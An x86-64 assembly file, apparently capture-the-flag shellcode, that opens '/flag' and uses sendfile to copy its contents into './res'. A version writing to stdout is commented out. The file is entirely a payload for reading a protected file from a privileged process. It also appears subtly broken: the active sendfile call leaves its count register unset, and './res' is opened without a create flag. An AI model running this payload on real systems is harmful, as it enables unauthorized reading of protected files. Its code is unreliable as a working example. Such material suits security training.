.global _start
_start:
.intel_syntax noprefix

#MOVE /flag TO STACK 
    mov r12, [rip + flagText]
    push r12

#OPEN /flag USING sys_open
    mov rax, 2      
    mov rdi, rsp        #filename (as memory address)
    mov rsi, 0          #flags
    mov rdx, 0          #mode (read)
    syscall
    mov r8, rax         #r8 = file descriptor /flag

#MOVE ./res TO STACK 
    mov r12, [rip + resText]
    push r12

#OPEN ./res USING sys_open
    mov rax, 2      
    mov rdi, rsp        #filename (as memory address)
    mov rsi, 2          #flags
    mov rdx, 0          #mode 0644o = 1A4
    syscall
    mov r9, rax         #r9 = file descriptor ~/res

#WRITE /flag TO stdout USING sys_sendfile
	#mov	rax, 40
    #mov	rdi, 1          #out fd
	#mov	rsi, r8         #in fd
    #mov rdx, 0          #offset
    #mov r10, 50         #size_t count
	#syscall

#WRITE /flag TO ./res USING sys_sendfile
	mov	rax, 40
    mov	rdi, r9         #out fd
	mov	rsi, r8         #in fd
    mov rdx, 0          #offset
	syscall

#EXIT USING sys_exit
	mov	rax, 60	
	mov	rdi, 0          #error_code
	syscall

flagText:
    .string "/flag"

resText:
    .string "./res"
